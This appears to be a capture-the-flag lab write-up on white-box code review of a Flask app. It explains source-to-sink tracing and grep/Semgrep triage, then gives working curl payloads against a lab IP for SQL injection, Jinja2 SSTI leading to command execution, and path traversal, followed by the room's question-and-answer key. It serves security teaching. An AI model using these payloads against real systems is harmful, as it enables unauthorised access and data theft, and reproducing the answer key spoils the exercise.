# Web Frameworks: Code Review

## Introduction

This room teaches **white-box testing** - auditing an application when you already have the source code, instead of poking at it blindly from the outside. The core skill is learning to read code the way an attacker reads it: not top-to-bottom like a story, but by asking "where does user input enter, and where does it eventually get used in a dangerous way?" That's the whole game. Once you can answer that question quickly for a codebase, finding real bugs stops being guesswork and becomes a repeatable process.

This writeup walks through that process step by step, in plain language, and then applies it to a real Flask target to find and exploit three separate vulnerabilities.

---

## Part 1 - Methodology

### 1.1 How to Read an Unfamiliar Codebase

If you just open random files in a project, you'll waste hours. The trick is to read things in the order that mirrors how a real request flows through the app - that way, by the time you reach the actual code that handles requests, you already understand the context around it.

Think of it like walking into a building you need to search: you'd check the front door and directory board before wandering into random rooms. Here's the order that works well for code:

| Step | What you read | Why this order matters |
|---|---|---|
| 1 | README / Docs | Tells you what the app is *supposed* to do, so you can recognize when something doesn't fit that purpose |
| 2 | Dependency Manifest (`requirements.txt`) | A single outdated, pinned library version can be a known CVE - worth checking before reading a single line of app logic |
| 3 | Configuration (`config.py`) | Settings like `DEBUG = True` or a hardcoded secret key change how every bug you find later should be treated |
| 4 | Routing | This is literally the map of everything the outside world can touch |
| 5 | Auth Middleware | Tells you which routes need a login and which don't - huge for prioritizing what to test first |
| 6 | Database / Models | Shows you what "normal" data access looks like, so anything that breaks that pattern jumps out later |
| 7 | Route Handlers | The actual deep-dive - by now you already know what's public, what's protected, and what normal queries look like |

In a Python/Flask project specifically: dependencies live in `requirements.txt`, routes are created with the `@app.route` decorator, and the debug flag plus secret key conventionally live in `config.py`.

### 1.2 The Source-to-Sink Model

This is the single most useful idea in the whole room. Almost every injection bug boils down to two points connected by a broken (or missing) safety check:

- **Source** - where untrusted data enters the app. In Flask, that's things like `request.args` (URL query string), `request.form` (submitted form data), `request.cookies`, or `request.json`.
- **Sink** - a function where that data, if unsanitized, causes real damage. Common ones:
  - `cursor.execute()` with raw string input → **SQL Injection**
  - `subprocess.run(..., shell=True)` → **Command Injection**
  - `render_template_string()` on unvalidated input → **Server-Side Template Injection (SSTI)**

The workflow is simple in concept: start at a sink, and walk backwards through the code until you either (a) find a source with no sanitization in between - confirmed bug - or (b) hit a point where the data was properly validated or parameterized - safe. In the room's example, `request.args.get("name")` flows straight into `render_template_string()` with nothing in between, which is a textbook SSTI.

### 1.3 Letting Tools Do the First Pass

Manually reading every line of a large app doesn't scale, so two tools do the heavy lifting before you ever touch a line by hand:

- **`grep -rn "pattern" .`** - dumb but fast text search. `-r` searches every file recursively, `-n` prints the line number of each match, so you instantly get a clickable list of every place a dangerous function name appears.
- **Semgrep** - smarter than grep because it understands code *structure* (via the Abstract Syntax Tree), not just text. It can spot a dangerous pattern even if variable names or formatting differ. Pointing it at a ready-made ruleset uses the `--config` flag:
  ```bash
  semgrep --config p/owasp-top-ten .
  ```
  This checks the whole codebase against curated OWASP Top 10 detection rules in one command.

The practical approach: **grep first for speed, then Semgrep for coverage**, and feed whatever both tools flag into the manual source-to-sink trace from 1.2.

### 1.4 The Vulnerability Classes in Play

| Class | What actually causes it | Typical sink |
|---|---|---|
| SQL Injection | Building a query with an f-string or `+` instead of a parameterized/bound query | `cursor.execute(f"...{input}...")` |
| Command Injection | `shell=True` hands the whole string to `/bin/sh`, so shell metacharacters (`;`, `&&`, backticks) get interpreted | `subprocess.run(cmd, shell=True)` |
| SSTI | A *user-influenced* string gets compiled and executed as a template, instead of being passed as inert data into a static template | `render_template_string(input)` |
| Insecure Deserialization | Rebuilding Python objects from an untrusted byte stream lets a crafted object's `__reduce__` method run arbitrary code the instant it's unpickled | `pickle.loads(data)` |
| Path Traversal | Joining user input straight into a filesystem path with no bounds-checking lets `../../..` walk outside the intended directory | `send_file(os.path.join(DIR, input))` |
| IDOR | Fetching a record by a client-supplied ID with no check that the current user actually owns it | `Vault.query.get(item_id)` with no ownership filter |

---

## Part 2 - Practical Audit: `10.48.166.84`

With the methodology in hand, this section applies it to a live Flask target and walks through each finding from discovery to a working exploit.

### 2.1 Triage

Running the grep/Semgrep pass against the pulled `app.py` immediately surfaced three worthwhile leads:
- A raw f-string feeding directly into `cursor.execute()` inside the `/search` handler.
- The *same* query parameter, used a second time in that same handler, feeding into `render_template_string()` - one tainted variable, two separate sink classes.
- `os.path.join()` feeding straight into `send_file()` inside `/files/download`, with no bounds-checking in sight.

### 2.2 Authenticating

Several routes require a session, so the first step is logging in and saving the resulting cookie for reuse:

```bash
curl -s -c jar --data "username=analyst&password=vaultkeeper" "http://10.48.166.84:8080/login"
```

`-c jar` saves the session cookie to a local file called `jar`. Every request after this reuses it with `-b jar`, so we stay logged in as `analyst` without re-sending credentials each time.

### 2.3 Finding 1 - SQL Injection in `/search`

**The code:**
```python
query = f"SELECT title, secret FROM vault WHERE owner_id = {uid} AND title LIKE '%{q}%'"
```

**Why it's broken:** `q` comes straight from the URL (`request.args`) and gets pasted directly into the SQL string. Because it's inserted *before* the database ever sees the query, any quote marks or SQL keywords the attacker types become part of the query's actual structure - not just data being searched for.

**Exploiting it:** Closing the string early with a single quote and appending a `UNION SELECT` pulls data from a completely different table (`system_flags`) that this endpoint was never meant to expose:

```bash
curl -s -b jar --get "http://10.48.166.84:8080/search" \
  --data-urlencode "q=' UNION SELECT flag, flag FROM system_flags-- -"
```

The trailing `-- -` comments out the rest of the original query so it doesn't cause a syntax error, and the `UNION SELECT` uses two columns to match the two columns (`title, secret`) the original query expects.

**Result:** Flag captured - `THM{REDACTED}`

### 2.4 Finding 2 - Server-Side Template Injection in `/search`

**The code:**
```python
return render_template_string(f"Results for: {q}")
```

**Why it's broken:** The same `q` parameter also gets handed to `render_template_string()`, which doesn't just display the text - it *compiles and runs it as a live Jinja2 template*. Jinja2 templates can reach into the full Python object graph available in their rendering context, so a carefully built string can climb from a harmless built-in object all the way to executing shell commands.

**Exploiting it:** `cycler` is one of the objects Jinja2 exposes by default. Walking from `cycler` to its `__init__` method exposes that method's `__globals__` - the module-level namespace it was defined in, which happens to include an imported `os` module. From there, `os.popen()` can run arbitrary commands:

```bash
curl -s -b jar --get "http://10.48.166.84:8080/search" \
  --data-urlencode "q={{ cycler.__init__.__globals__.os.popen('printenv FLAG2').read() }}"
```

This achieves full command execution purely through template evaluation, even though nothing in the code directly calls a shell function - Jinja2's flexibility recreates one.

**Result:** Flag captured - `THM{REDACTED}`

### 2.5 Finding 3 - Path Traversal in `/files/download`

**The code:**
```python
return send_file(os.path.join(UPLOAD_DIR, filename))
```

**Why it's broken:** `os.path.join()` just glues path pieces together - it has no idea what `..` means and won't stop it. If `filename` is attacker-controlled, a value like `../../../flag3.txt` makes the joined path resolve to somewhere completely outside `UPLOAD_DIR`, and `send_file()` will serve whatever ends up at that path with no further checks.

**Exploiting it:**
```bash
curl -s -b jar "http://10.48.166.84:8080/files/download?file=../../../flag3.txt"
```

**Result:** Flag captured - `THM{REDACTED}`

---

## Appendix - Full Command Reference

```bash
# Authenticate and persist session cookie
curl -s -c jar --data "username=analyst&password=vaultkeeper" "http://10.48.166.84:8080/login"

# Finding 1: SQL Injection - UNION-based dump of system_flags
curl -s -b jar --get "http://10.48.166.84:8080/search" \
  --data-urlencode "q=' UNION SELECT flag, flag FROM system_flags-- -"

# Finding 2: SSTI - RCE via Jinja2 cycler gadget
curl -s -b jar --get "http://10.48.166.84:8080/search" \
  --data-urlencode "q={{ cycler.__init__.__globals__.os.popen('printenv FLAG2').read() }}"

# Finding 3: Path Traversal - directory escape to root flag
curl -s -b jar "http://10.48.166.84:8080/files/download?file=../../../flag3.txt"

# Static analysis triage
grep -rn "shell=True" .
grep -rn "render_template_string" .
semgrep --config p/owasp-top-ten .
```

---

## Part 3 - Full Room Q&A

### Task 2: Orienting in a Codebase
- **Q:** Which file conventionally holds the dependency manifest in a Python project?
  **A:** `requirements.txt`
- **Q:** Which decorator marks a function as a route (entry point) in a Flask application?
  **A:** `@app.route`
- **Q:** Which file conventionally holds the debug flag and secret key in a Flask app?
  **A:** `config.py`

### Task 3: Source-to-Sink Analysis
- **Q:** What do we call the point where a value entered the application from the client?
  **A:** `source`
- **Q:** `render_template_string` and `subprocess.run(..., shell=True)` are both examples of which type of location?
  **A:** `sink`
- **Q:** `request.args.get("name")` flowing into `render_template_string` with no validation creates which vulnerability class?
  **A:** `SSTI`

### Task 4: Grepping for Danger
- **Q:** Which two-flag combination gives recursion plus line numbers in grep?
  **A:** `-rn`
- **Q:** Which flag selects a Semgrep ruleset such as `p/owasp-top-ten`?
  **A:** `--config`

### Task 5: Injection Vulnerabilities in Code
- **Q:** Which keyword argument, when present in `subprocess.run()`, hands the whole command string to the shell?
  **A:** `shell=True`
- **Q:** Which Python function loads attacker-controlled bytes back into live objects, enabling code execution?
  **A:** `pickle.loads`

### Task 6: Access Control, Path, and Secret Flaws in Code
- **Q:** Which Flask function is the safe counterpart to `send_file(os.path.join(...))`?
  **A:** `send_from_directory`
- **Q:** What is the common acronym for querying a record by ID with no ownership check?
  **A:** `IDOR`

### Task 7: Practical - Auditing a Flask Application
- **Q:** What is the flag from the SQL Injection exploit?
  **A:** `THM{REDACTED}`
- **Q:** What is the flag from the SSTI exploit?
  **A:** `THM{REDACTED}`
- **Q:** What is the flag from the Path Traversal exploit?
  **A:** `THM{REDACTED}`